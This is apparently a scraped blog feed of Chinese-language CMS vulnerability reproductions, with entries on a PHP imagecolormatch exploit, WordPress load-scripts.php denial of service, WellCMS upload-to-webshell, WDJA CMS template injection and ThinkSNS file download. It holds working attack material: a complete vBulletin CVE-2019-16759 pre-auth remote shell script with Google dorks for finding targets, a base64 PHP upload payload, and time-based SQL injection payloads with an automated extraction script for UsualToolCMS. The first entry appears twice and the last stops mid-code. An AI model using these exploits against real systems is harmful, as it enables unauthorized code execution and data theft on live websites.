        <content type="html"><![CDATA[<h1 id="imagecolormatch-OOB-Heap-Write-exploit"><a href="#imagecolormatch-OOB-Heap-Write-exploit" class="headerlink" title="imagecolormatch() OOB Heap Write exploit"></a>imagecolormatch() OOB Heap Write exploit</h1><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>My binary exploit for <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6977" target="_blank" rel="noopener">CVE-2019-6977</a>.<br>Bug found by Simon Scannell from RIPS.</p><p>PHP bug is <a href="https://bugs.php.net/bug.php?id=77270" target="_blank" rel="noopener">here</a>.<br>Helps you bypass PHP’s <code>disable_functions</code> INI directive.</p><p>I commented <strong>a lot</strong> to help people that are new to binary PHP exploitation. Hope this helps.</p><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://target.com/exploit.php?f=0x7fe83d1bb480&amp;c=id+&gt;+/dev/shm/titi</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nenuphar.ce: 0x7fe834a10018</span><br><span class="line">Nenuphar2.ce: 0x7fe834a10d70</span><br><span class="line">Nenuphar.properties: 0x7fe834a01230</span><br><span class="line">z.val: 0x7fe834aaea18</span><br><span class="line">Difference: 0xad7e8</span><br><span class="line"></span><br><span class="line">Exploit SUCCESSFUL !</span><br></pre></td></tr></table></figure><p>From:<a href="https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch" target="_blank" rel="noopener">https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2019-6977-imagecolormatch/</url>
      
        <content type="html"><![CDATA[<h1 id="imagecolormatch-OOB-Heap-Write-exploit"><a href="#imagecolormatch-OOB-Heap-Write-exploit" class="headerlink" title="imagecolormatch() OOB Heap Write exploit"></a>imagecolormatch() OOB Heap Write exploit</h1><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>My binary exploit for <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6977" target="_blank" rel="noopener">CVE-2019-6977</a>.<br>Bug found by Simon Scannell from RIPS.</p><p>PHP bug is <a href="https://bugs.php.net/bug.php?id=77270" target="_blank" rel="noopener">here</a>.<br>Helps you bypass PHP’s <code>disable_functions</code> INI directive.</p><p>I commented <strong>a lot</strong> to help people that are new to binary PHP exploitation. Hope this helps.</p><h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://target.com/exploit.php?f=0x7fe83d1bb480&amp;c=id+&gt;+/dev/shm/titi</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nenuphar.ce: 0x7fe834a10018</span><br><span class="line">Nenuphar2.ce: 0x7fe834a10d70</span><br><span class="line">Nenuphar.properties: 0x7fe834a01230</span><br><span class="line">z.val: 0x7fe834aaea18</span><br><span class="line">Difference: 0xad7e8</span><br><span class="line"></span><br><span class="line">Exploit SUCCESSFUL !</span><br></pre></td></tr></table></figure><p>From:<a href="https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch" target="_blank" rel="noopener">https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/CVE-2018-6389/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2018-6389-Wordpress-Exploit"><a href="#CVE-2018-6389-Wordpress-Exploit" class="headerlink" title="CVE-2018-6389 Wordpress Exploit"></a>CVE-2018-6389 Wordpress Exploit</h1><p>CVE-2018-6389 Exploit Can Down Any Wordpress site under 4.9.3 <br><br>The flaw affects the <em>load-scripts.php</em> WordPress script, it receives a parameter called load[] </p><h2 id="About-PoC"><a href="#About-PoC" class="headerlink" title="About PoC"></a>About PoC</h2><p>A simple Script In Python With threading could allow anyone to take down most WordPress websites with single machine</p><p><strong>脚本github获取</strong></p><h3 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h3><p>Can Down Any Website with Tested Wordpress versions <br></p><ul><li>Tested : WordPress (Version 4.9.2) </li><li>Tested : WordPress (Version 4.9.1)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Note : I Am Not The Author Of the Exploit</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul><li><a href="https://www.youtube.com/watch?v=nNDsGTalXS0" target="_blank" rel="noopener">PoC</a> - Youtube</li><li><a href="https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html" target="_blank" rel="noopener"> Barak Tawily </a> - Blog</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/WellCMS/WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="WellCMS"><a href="#WellCMS" class="headerlink" title="WellCMS"></a>WellCMS</h3><p>WellCMS是一款开源、倾向移动端的轻量级CMS，高负载CMS，亿万级CMS，是大数据量、高并发访问网站最佳选择的轻CMS。登陆该CMS后台，某图片上传处，由于上传文件类型可控，可修改上传文件类型获取webshell。</p><h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>第一步，登陆该CMS后台：</p><p><img src="WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/70e34c3d033f885f6948a8fbc18c1bb5.png" alt></p><p>第二步，进入“后台管理“，定位利用点，点击下图红框中图片进行上传：<br><img src="WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/c06ea4b5ee31bac075041572d6906ca6.png" alt></p><p>上传并抓取数据包：<br><img src="WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/cd41890e7ee30da49aa453a757f072ce.png" alt></p><p>第三步，修改post包中“filetype”参数类型为“php”；经分析 “data”参数为base64加密，这里我们将测试数据“&lt;?php phpinfo();?&gt;”经过base64加密等构造，形成“data”参数的数据：data%3Aimage%2Fjpeg%3Bbase64%2CPD9waHAgcGhwaW5mbygpOz8%2B，最后数据包放行，返回成功上传为php文件的路径：<br><img src="WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/9c05c1a298aa17c4e062c9105c4c5e7c.png" alt></p><p>最后，尝试访问，成功：<br><img src="WellCMS%202.0%20Beta3%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/6b73de10dd5792901b5fd4267c5e6afb.png" alt></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>根据漏洞定位代码文件：route/attach.php，代码如下：<br>if ($action == ‘create’) {</p><pre><code>// hook attach_create_start.phpuser_login_check();// hook attach_create_check_after.php$backstage = param(2, 0);$width = param(&apos;width&apos;, 0);$height = param(&apos;height&apos;, 0);$is_image = param(&apos;is_image&apos;, 0); // 图片$name = param(&apos;name&apos;);$data = param_base64(&apos;data&apos;);$mode = param(&apos;mode&apos;, 0); // 上传类型 1主图$filetype = param(&apos;filetype&apos;); // 压缩图片后缀jpeg jpg png等$convert = param(&apos;convert&apos;, 0); // 图片转换压缩 = 1$n = param(&apos;n&apos;, 0); // 对应主图赋值$type = param(&apos;type&apos;, 0); // type = 0则按照SESSION数组附件数量统计，type = 1则按照传入的n数值// hook attach_create_before.php// 允许的文件后缀名//$types = include _include(APP_PATH.&apos;conf/attach.conf.php&apos;);//$allowtypes = $types[&apos;all&apos;];empty($group[&apos;allowattach&apos;]) AND $gid != 1 AND message(2, &apos;您无权上传&apos;);// hook attach_create_center.phpempty($data) AND message(1, lang(&apos;data_is_empty&apos;));//$data = base64_decode_file_data($data);$size = strlen($data);$size &gt; 20480000 AND message(1, lang(&apos;filesize_too_large&apos;, array(&apos;maxsize&apos; =&gt; &apos;20M&apos;, &apos;size&apos; =&gt; $size)));// hook attach_create_file_ext_start.php// 获取文件后缀名 111.php.shtmll$ext = file_ext($name, 7);$filetypes = include APP_PATH . &apos;conf/attach.conf.php&apos;;// hook attach_create_file_ext_before.php//主图必须为图片if ($is_image == 1 &amp;&amp; $mode == 1 &amp;&amp; !in_array($ext, $filetypes[&apos;image&apos;])) message(1, lang(&apos;well_up_picture_error&apos;));// hook attach_create_file_ext_center.php// 如果文件后缀不在规定范围内 改变后缀名//!in_array($ext, $filetypes[&apos;all&apos;]) AND $ext = &apos;_&apos; . $ext;if (!in_array($ext, $filetypes[&apos;all&apos;])) {    $ext = &apos;_&apos; . $ext;} else {    // CMS上传图片    $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype;}// hook attach_create_file_ext_after.php$tmpanme = $uid . &apos;_&apos; . xn_rand(15) . &apos;.&apos; . $ext;// hook attach_create_tmpanme_after.php$tmpfile = $conf[&apos;upload_path&apos;] . &apos;tmp/&apos; . $tmpanme;// hook attach_create_tmpfile_after.php$tmpurl = $conf[&apos;upload_url&apos;] . &apos;tmp/&apos; . $tmpanme;// hook attach_create_tmpurl_after.php$filetype = attach_type($name, $filetypes);// hook attach_create_save_before.phpfile_put_contents($tmpfile, $data) OR message(1, lang(&apos;write_to_file_failed&apos;));// hook attach_create_save_after.php// 保存到 session，发帖成功以后，关联到帖子。// save attach information to session, associate to post after create thread.// 抛弃之前的 $_SESSION 数据，重新启动 session，降低 session 并发写入的问题// Discard the previous $_SESSION data, restart the session, reduce the problem of concurrent session writesess_restart();empty($t) AND empty($_SESSION[&apos;tmp_files&apos;]) AND $_SESSION[&apos;tmp_files&apos;] = array();$t == 1 AND empty($_SESSION[&apos;tmp_website_files&apos;]) AND $_SESSION[&apos;tmp_website_files&apos;] = array();// hook attach_create_after.php// type = 0则按照SESSION数组附件数量统计，type = 1则按照传入的n数值empty($type) AND $n = ($t == 1) ? count($_SESSION[&apos;tmp_website_files&apos;]) : count($_SESSION[&apos;tmp_files&apos;]);$filesize = filesize($tmpfile);$attach = array(    &apos;backstage&apos; =&gt; $backstage, // 0前台 1后台    &apos;url&apos; =&gt; $backstage ? &apos;../&apos; . $tmpurl : &apos;&apos; . $tmpurl,    &apos;path&apos; =&gt; $tmpfile,    &apos;orgfilename&apos; =&gt; $name,    &apos;filetype&apos; =&gt; $filetype,    &apos;filesize&apos; =&gt; $filesize,    &apos;width&apos; =&gt; $width,    &apos;height&apos; =&gt; $height,    &apos;isimage&apos; =&gt; $is_image,    &apos;downloads&apos; =&gt; 0,    &apos;aid&apos; =&gt; &apos;_&apos; . $n);// hook attach_create_array_after.phpif ($mode == 1) {    // hook attach_create_thumbnail_beofre.php    $_SESSION[&apos;tmp_thumbnail&apos;] = $attach;    // hook attach_create_thumbnail_after.php} else {    // hook attach_create_website_files_beofre.php    // 0 BBS 1 CMS    $t == 1 ? $_SESSION[&apos;tmp_website_files&apos;][$n] = $attach : $_SESSION[&apos;tmp_files&apos;][$n] = $attach;    // hook attach_create_website_files_after.php}// hook attach_create_session_after.phpunset($attach[&apos;path&apos;]);// hook attach_create_end.phpmessage(0, $attach);</code></pre><p>大致流程：</p><p>1、 首先，接受相关参数，将filetype自行设置成“php”：</p><pre><code>$data = param_base64(&apos;data&apos;);$filetype = param(&apos;filetype&apos;); /</code></pre><p>2、 进行逻辑判断：</p><p>if (!in_array($ext, $filetypes[‘all’])) {</p><pre><code>    $ext = &apos;_&apos; . $ext;} else {    // CMS上传图片    $t == 1 AND $convert == 1 AND $is_image == 1 AND $ext = $filetype;}</code></pre><p>3、 最后成功写入：</p><p>$tmpanme = $uid . ‘_’ . xn_rand(15) . ‘.’ . $ext;</p><pre><code>// hook attach_create_tmpanme_after.php$tmpfile = $conf[&apos;upload_path&apos;] . &apos;tmp/&apos; . $tmpanme;// hook attach_create_tmpfile_after.php$tmpurl = $conf[&apos;upload_url&apos;] . &apos;tmp/&apos; . $tmpanme;// hook attach_create_tmpurl_after.php$filetype = attach_type($name, $filetypes);// hook attach_create_save_before.phpfile_put_contents($tmpfile, $data) OR message(1, lang(&apos;write_to_file_failed&apos;));</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/WDJACMS/WDJACMS1.5.2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/WDJACMS/WDJACMS1.5.2%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>WDJA CMS 1.5.2模板注入漏洞 漏洞发掘分析 前言 这是年初无聊在家审的一个小众的CMS，漏洞官方已经修复，现在分享出来给大家，希望一起共同学习和进步。 代码审计 <code>漏洞文件：\common\incfiles\function.inc.php</code> 全局搜索中发现这个cms的模板引擎是使用eval来实现的。 <img src="WDJACMS1.5.2模板注入漏洞/1576941887696.png" alt="img"> 我们 跟进<code>ii_eval()</code>函数。非常这里<code>$strers</code>可控疑似存在代码执行。我们在继续跟进<code>ii_eval()</code>看谁调用了他。 <img src="WDJACMS1.5.2模板注入漏洞/15769419845118.png" alt="img"> <code>漏洞文件：\common\incfiles\function.inc.php</code> 只有一个地方对他进行了调用，他是<code>ii_creplace()</code>函数 <img src="WDJACMS1.5.2模板注入漏洞/15769420731387.png" alt="img"> 我们看<code>ii_creplace()</code>代码，<code>$strers</code>可控，但是它必须匹配<code>({\$=(.[^\}]*)})</code>这个正则类似于下面： <code>{$=phpinfo()}</code> <img src="WDJACMS1.5.2模板注入漏洞/15769423583552.png" alt="img"> <code>漏洞文件passport\address\common\incfiles\manage_config.inc.php</code> 那么我们继续跟进<code>ii_creplace()</code>函数看谁对他进行了调用，找了很多但是都对函数中的<code>$</code>进行了转义，但是在<code>passport\address\common\incfiles\manage_config.inc.php</code>中的<code>wdja_cms_admin_manage_list()</code>并未做任何过滤。我们继续跟进。 <img src="WDJACMS1.5.2模板注入漏洞/15769426132007.png" alt="img"> 我们发现<code>\passport\address\manage.php</code>对<code>passport\address\common\incfiles\manage_config.inc.php</code>进行了包含并调用了<code>wdja_cms_admin_manage_action()</code>,而它调用了<code>wdja_cms_admin_manage_list()</code>,那么很明显我们只需将符合<code>{\$=(.[^\}]*)}</code>正则的payload传入即可导致getshell. <img src="WDJACMS1.5.2模板注入漏洞/15769428105956.png" alt="img"> 那么从哪传入呢，我们直接把<code>wdja_cms_admin_manage_list()</code>中的sql语句打印出来即可知道。 <img src="WDJACMS1.5.2模板注入漏洞/15769430952853.png" alt="img"> <img src="WDJACMS1.5.2模板注入漏洞/15769431224043.png" alt="img"> 很明显是从用户地址中获取。 <img src="WDJACMS1.5.2模板注入漏洞/image-20191221234802438.png" alt="image-20191221234802438"> Getshell 先注册一个会员 <code>http://www.域名.com/passport/?type=register</code> 在添加地址出写入要注入的命令,确认添加地址即可。 <code>http://www.域名.com/passport/address/index.php?type=list</code> <img src="WDJACMS1.5.2模板注入漏洞/15769412265912.png" alt="img"> <img src="WDJACMS1.5.2模板注入漏洞/15769412702349.png" alt="img"> getshell exp,同样方法在地址出写入下面代码即可在<code>passport\address</code>路径下生成一个shell.php <img src="WDJACMS1.5.2模板注入漏洞/微信图片_20201102133040.png" alt="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20201102133040.png"> <img src="WDJACMS1.5.2模板注入漏洞/15769414579686.png" alt="img"> <img src="WDJACMS1.5.2模板注入漏洞/15769415518386.png" alt="img"></p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=misc&amp;action=viewthreadmod&amp;tid=59066" target="_blank" rel="noopener">本主题由 村长CZ 于 2020-11-17 18:53 添加图章 100元奖金</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/vBulletin/CVE-2019-16759%20vBulletin%205.x%200day%20pre-auth%20RCE%20exploit/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2019-16759 vBulletin 5.x 0day pre-auth RCE exploit ，无需预认证即可执行远程代码执行漏洞 </p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>不需要在目标论坛上注册帐户,即可在运行vBulletin安装的服务器上执行shell命令 </p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><h3 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h3><blockquote><p>vBulletin 5.x </p></blockquote><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><blockquote><p>vBulletin v5（5.0.0到5.5.4）版本  </p></blockquote><h3 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h3><blockquote><p>vBulletin  </p></blockquote><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># vBulletin 5.x 0day pre-auth RCE exploit</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># This should work on all versions from 5.0.0 till 5.5.4</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Google Dorks:</span></span><br><span class="line"><span class="comment"># - site:*.vbulletin.net</span></span><br><span class="line"><span class="comment"># - "Powered by vBulletin Version 5.5.4"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    sys.exit(<span class="string">"Usage: %s &lt;URL to vBulletin&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">proxies =&#123;</span><br><span class="line">     <span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080/"</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;<span class="string">"routestring"</span>:<span class="string">"ajax/render/widget_php"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">          cmd = raw_input(<span class="string">"&gt;&gt;&gt;Shell= "</span>)</span><br><span class="line">          params[<span class="string">"widgetConfig[code]"</span>] = <span class="string">"echo shell_exec('"</span>+cmd+<span class="string">"');echo md5('vBulletin'); exit;"</span></span><br><span class="line">          r = requests.post(url = sys.argv[<span class="number">1</span>], data = params, proxies=proxies)</span><br><span class="line">          <span class="keyword">if</span> r.status_code == <span class="number">200</span> <span class="keyword">or</span> r.status_code ==<span class="number">403</span> <span class="keyword">and</span> <span class="string">'be4ea51d962be8308a0099ae1eb3ec63'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">               <span class="keyword">print</span></span><br><span class="line">               <span class="keyword">print</span> r.text.split(<span class="string">'be4ea51d962be8308a0099ae1eb3ec63'</span>)[<span class="number">0</span>]</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">               sys.exit(<span class="string">"Exploit failed! :("</span>)</span><br><span class="line">     <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          sys.exit(<span class="string">"\nClosing shell..."</span>)</span><br><span class="line">     <span class="keyword">except</span> Exception, e:</span><br><span class="line">          sys.exit(str(e))</span><br></pre></td></tr></table></figure><p>### </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/UsualToolCMS/UsualToolCMS-8.0%20sql%E6%B3%A8%E2%BC%8A%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h3><p>版本信息：UsualToolCMS-8.0-Release<br> 版本下载：<a href="http://www.a5xiazai.com/php/140604.html" target="_blank" rel="noopener">http://www.a5xiazai.com/php/140604.html</a><br> 官网下载：<a href="https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip" target="_blank" rel="noopener">https://cms.usualtool.com/down/UsualToolCMS-8.0-Release.zip</a></p><h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>在./cmsadmin/a_templetex.php文件第137行，paths变量没有过滤，136行从get处获取paths，没有任何过滤:<br><img src="UsualToolCMS-8.0 sql注⼊漏洞/1.png" alt="1"></p><p>当从get处获得的t等于open时就可以出发这个sql注入，在文件第129行:<br><img src="UsualToolCMS-8.0 sql注⼊漏洞/2.png" alt="2"></p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copya_templetex.php?t=open&amp;id=1&amp;paths=templete/index&apos; where id=1 and if(ascii(substring(user(),1,1))&gt;0,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p><img src="UsualToolCMS-8.0 sql注⼊漏洞/3.png" alt="3"></p><p>由于是时间盲注，编写延迟注入脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Copy# -*- coding:utf-8 -*-</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">session = requests.session()</span><br><span class="line">headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&apos;&#125;</span><br><span class="line">img_url = &apos;http://192.168.8.108:8081/UsualToolCMS-8.0-Release/class/UsualToolCMS_Code.php?r=13720&apos;</span><br><span class="line">img_req = session.get(url=img_url,headers=headers).content</span><br><span class="line">with open(&apos;pic.png&apos;,&apos;wb&apos;) as f:</span><br><span class="line">    f.write(img_req)</span><br><span class="line">code = input(&apos;请输入验证码：&apos;)</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;uuser&apos;:&apos;admin&apos;,</span><br><span class="line">    &apos;upass&apos;:&apos;admin&apos;,</span><br><span class="line">    &apos;ucode&apos;:code</span><br><span class="line">&#125;</span><br><span class="line">payloads = list(&apos;root@localhostasfafsasf&apos;)</span><br><span class="line">url = &apos;http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_login.php?do=login&apos;</span><br><span class="line">response = session.post(url=url,headers=headers,data=data)</span><br><span class="line">res_url_1 = &quot;http://192.168.8.108:8081/UsualToolCMS-8.0-Release/cmsadmin/a_templetex.php?t=open&amp;id=1&amp;paths=templete/index&apos; where id=1 and if(ascii(substring(user(),&#123;&#125;,1))=&#123;&#125;,sleep(5),1)--+&quot;</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for i in range(1,15):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        res_url_2 = res_url_1.format(str(i),ord(payload))</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        response = session.get(url=res_url_2,headers=headers)</span><br><span class="line">        if time.time() - start_time &gt; 7:</span><br><span class="line">            result = result + payload</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>爆数据库表payload：<img src="UsualToolCMS-8.0 sql注⼊漏洞/4.png" alt="4"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copya_templetex.php?t=open&amp;id=1&amp;paths=templete/index&apos; where id=1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(5),1)--+</span><br></pre></td></tr></table></figure><p><img src="UsualToolCMS-8.0 sql注⼊漏洞/5.png" alt="5"></p><p>-—————————————————————————</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkSNS-V4-后台任意文件下载导致Getshell"><a href="#ThinkSNS-V4-后台任意文件下载导致Getshell" class="headerlink" title="ThinkSNS_V4 后台任意文件下载导致Getshell"></a>ThinkSNS_V4 后台任意文件下载导致Getshell</h1><h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><pre><code>ThinkSNS官网：http://www.thinksns.com网站源码版本：ThinkSNS V4  更新时间：2017-09-13程序源码下载：http://www.thinksns.com/experience.html（填写信息后，提交并下载代码）默认后台地址：http://127.0.0.1/index.php?app=admin&amp;mod=Public&amp;act=login默认用户密码：管理员帐号: admin@admin.com 密码自设，大于6位</code></pre><h2 id="Code-analysis"><a href="#Code-analysis" class="headerlink" title="Code analysis"></a>Code analysis</h2><p>存在漏洞代码<code>\ts4\apps\admin\Lib\Action\UpgradeAction.class.php</code>中的一个函数中。</p><pre><code>public function step1(){    $downUrl = $_GET[&apos;upurl&apos;];    $downUrl = urldecode($downUrl);    $path = DATA_PATH.&apos;/&apos;.&apos;upgrade/&apos;.basename($downUrl);    // # 备份老配置文件    $oldConf = file_get_contents(CONF_PATH.&apos;/thinksns.conf.php&apos;);    file_put_contents(DATA_PATH.&apos;/old.thinksns.conf.php&apos;, $oldConf);    // # 下载增量包    is_dir(dirname($path)) or 